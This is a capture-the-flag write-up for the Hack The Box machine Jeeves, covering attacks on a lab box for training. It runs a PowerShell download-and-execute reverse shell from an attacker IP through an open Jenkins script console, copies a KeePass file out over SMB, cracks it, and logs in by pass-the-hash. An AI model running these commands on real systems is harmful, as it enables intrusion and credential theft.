# Jeeves

This is the write-up for the box Jeeves that got retired at the 19th May 2018.
My IP address was 10.10.14.29 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.63    jeeves.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/jeeves.nmap 10.10.10.63
```

```markdown
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 5h01m15s, deviation: 0s, median: 5h01m14s
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode:
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-03-04T23:45:17
|_  start_date: 2020-03-04T22:53:38
```

## Checking HTTP (Port 80)

On the web page on port 80 there is some kind of search engine:

![Ask Jeeves search engine](https://kyuu-ji.github.io/htb-write-up/jeeves/jeeves_web-1.png)

When searching for anything it redirects to _/error.html_ which looks like a Microsoft SQL Server error message but is just an image.
This is a rabbit hole.

## Checking HTTP (Port 50000)

On the web page on port 50000 it shows a HTTP Error 404 from **Jetty** an nothing more.
Lets enumerate hidden directories with **Gobuster**:
```markdown
gobuster -u http://10.10.10.63:50000 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

It finds the directory _/askjeeves_ which directs us to a **Jenkins** dashboard without authorization.

As we have full control over Jenkins, there are several ways to get code execution.
```markdown
Manage Jenkins --> Script Console
```

![Ask Jeeves search engine](https://kyuu-ji.github.io/htb-write-up/jeeves/jeeves_jenkins-1.png)

In here it is possible to execute **Groovy Script** so lets test out code execution with that:
```markdown
cmd = "whoami"
println cmd.execute().text
```

This outputs the name of the local user _kohsuke_.
So now we can start a reverse shell. I will use the _Invoke-PowerShellTcp.ps1_ script from the **Nishang Framework**:
```markdown
cmd = """ powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.29/Invoke-PowerShellTcp.ps1')" """
println cmd.execute().text
```

After running this, the listener on my IP and port 9001 starts a reverse shell.

## Privilege Escalation

Now we are the user _kohsuke_ and need an attack surface on the box.
Looking at the files in the home directory _C:\Users\kohsuke_ there is a **KeePass** database in _\Documents_.
I start a SMB server on my local client and mount it on the box, in case there is more to download:
```markdown
# On local client
impacket-smbserver Share `pwd`


# On Jeeves
New-PSDrive -Name "NewShare" -PSProvider "FileSystem" -Root "\\10.10.14.29\Share"
cd NewShare:
cp C:\Users\kohsuke\Documents\CEH.kdbx .
```

This file can be converted into a hash that needs to be cracked:
```markdown
keepass2john CEH.kdbx
```

Cracking it with **Hashcat**:
```markdown
hashcat -m 13400 hash.keepass /usr/share/wordlists/rockyou.txt
```

It gets cracked and the password is:
> moonshine1

There are different passwords in there but the most interesting ones are:
- _DC Recovery PW_ with the username _administrator_ and the password _S1TjAtJHKsugh9oC4VZl_
- _Backup stuff_ with no username and the NTLM hash _aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00_

Trying to login with these credentials:
```markdown
winexe -U jenkins/administrator //10.10.10.63 cmd.exe
```

This does not work so lets try using the NTLM hash for the user _Administrator_ with `pth-winexe`.
```markdown
pth-winexe -U jenkins/administrator //10.10.10.63 cmd.exe
```

This does a **Pass-The-Hash** attack and logs us in as _Administrator_!

### Looking for the root flag

The flag in the home directory is called _hm.txt_ and has the following content:
> The flag is elsewhere.  Look deeper.

Checking the directory with `dir /r` it seems like the _hm.txt_ file hides the _root.txt_ file via **Alternate Data Stream**.
Using the following command to bypass this:
```markdown
powershell (Get-Content hm.txt -Stream root.txt)
```

This outputs the contents of _root.txt_.
